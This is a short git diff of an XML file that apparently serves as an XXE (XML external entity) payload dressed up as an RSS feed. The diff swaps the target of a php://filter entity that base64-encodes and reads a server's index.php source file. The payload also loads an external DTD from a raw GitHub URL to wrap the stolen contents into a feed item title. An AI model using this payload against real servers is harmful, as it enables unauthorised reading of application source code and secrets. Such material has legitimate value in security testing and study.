@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index2.php">
+ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  <!ENTITY % start SYSTEM "<![CDATA["> 
  <!ENTITY % end SYSTEM "]]>">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
@@ -12,7 +12,7 @@
   <link>http://www.w3schools.com/xml/xml_rss.asp</link>
   <description>Free web building tutorials</description>
   <item>
-    <title>&all;</title>
+    <title>VALID TEXT: &all;</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
